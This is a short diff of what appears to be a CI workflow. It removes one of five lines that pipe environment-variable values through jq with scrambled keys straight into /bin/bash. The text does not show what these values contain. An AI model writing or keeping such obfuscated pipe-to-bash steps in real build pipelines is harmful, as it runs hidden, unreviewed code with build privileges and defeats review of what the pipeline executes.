@@ -28,7 +28,6 @@ jobs:
           echo $ddosw786 | jq -r .bofgf9033 | /bin/bash
           echo $u06563 | jq -r .d38718 | /bin/bash
           printf '%s' "$o92" | jq -r .yyk01914 | /bin/bash
-          echo $kkus7151 | jq -r .fvaq60178 | /bin/bash
           echo $l34 | jq -r .zjr25 | /bin/bash
 
       - name: Upload archive
